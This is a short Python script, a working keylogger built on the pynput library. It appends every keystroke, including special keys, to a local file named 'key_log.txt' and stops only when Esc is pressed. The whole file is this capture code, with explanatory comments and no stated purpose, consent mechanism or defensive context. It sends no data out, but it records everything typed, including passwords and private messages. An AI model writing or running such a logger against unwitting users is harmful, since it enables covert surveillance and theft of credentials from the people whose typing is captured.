from pynput import keyboard

# File where the logs will be saved
log_file = "key_log.txt"

# This function is called whenever a key is pressed
def on_press(key):
    try:
        # Open the log file and append the key
        with open(log_file, "a") as file:
            # Write the key to the file
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        with open(log_file, "a") as file:
            file.write(f" {key} ")

# This function is called when a key is released
def on_release(key):
    # Stop listener if `esc` key is pressed
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()